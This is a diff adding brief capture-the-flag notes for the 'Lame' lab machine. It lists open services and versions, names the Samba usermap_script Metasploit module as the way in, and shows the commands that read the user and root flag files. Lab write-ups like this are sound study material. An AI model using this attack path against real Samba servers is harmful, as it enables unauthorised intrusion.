@@ -1,0 +1,10 @@
+Lame
+=============================
+- 21: FTP anonymous 2.3.4
+- 22: SSH
+- 139,445 SMB 3.0.20
+-----------------------------
+- Samba Exploit 16320: 
+  => MSF use exploit/multi/samba/usermap_script
+- cat /root/root.txt 
+- cat /home/makis/user.txt 
